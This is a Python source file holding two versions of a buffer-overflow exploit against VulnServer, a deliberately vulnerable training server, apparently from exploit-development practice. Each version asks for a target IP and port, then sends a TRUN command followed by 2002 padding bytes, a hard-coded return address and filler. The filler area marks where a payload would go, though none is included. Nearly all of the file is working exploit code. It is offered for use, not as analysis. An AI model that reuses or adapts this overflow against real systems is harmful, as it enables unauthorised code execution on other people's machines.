#!/usr/bin/python3 

import sys,socket
import time

print("*****VulnServer*****")
ip_address=input("Enter the IP address:\n")
port=input("Enter the port number:\n")


if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*40)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*40)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*40)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*40)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port)>0):
    buffer=b"A"*2002 + b"\xAF\x11\x50\x62" + b"C"*(2500-4-2002)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address,int(port)))
    s.send(b"TRUN /.:/ " + buffer)
--------------------------------------------------------------------------------------------------------------------------------
#!/usr/bin/python3

import sys,socket

ip_address=input("Enter the IP address:\n")
port_number=input("Enter the port number:\n")


if len(ip_address)==0 or len(port_number)==0:
    if len(ip_address)>0 and len(port_number)==0:
        print("*"*50)
        print("Port number field is empty")
    elif len(ip_address)==0 and len(port_number)>0:
        print("*"*50)
        print("IP address field is empty")
    elif len(ip_address)==0 and len(port_number)==0:
        print("*"*50)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*50)
        print("Issues with the user input")
elif len(ip_address)>0 and len(port_number)>0:
    if not port_number.isdigit():
        print("*"*50)
        print("Port number field must accept only numeric digits")
    else:
        buffer_size=b"A"* 2002 + b"\xAF\x11\x50\x62" + b"C"*(2500-4-2002)

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address,int(port_number)))
        s.send(b"TRUN /.:/ " + buffer_size)
        s.close()

